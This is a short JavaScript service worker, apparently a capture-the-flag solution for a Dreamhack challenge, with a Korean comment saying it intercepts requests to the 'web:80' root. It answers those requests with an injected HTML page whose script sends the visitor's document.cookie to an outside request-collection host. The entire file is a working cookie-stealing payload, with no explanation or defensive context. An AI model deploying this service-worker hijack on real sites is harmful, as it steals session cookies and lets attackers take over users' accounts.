self.addEventListener('fetch', (event) => {
    // web:80/ 경로로 들어오는 요청을 가로챔
    if (event.request.url === 'http://web:80/') {
        event.respondWith(
            new Response(`
                <script>
                    fetch('https://lleayzn.request.dreamhack.games/?c=' + document.cookie);
                </script>
            `, { headers: { 'Content-Type': 'text/html' } })
        );
    }
});
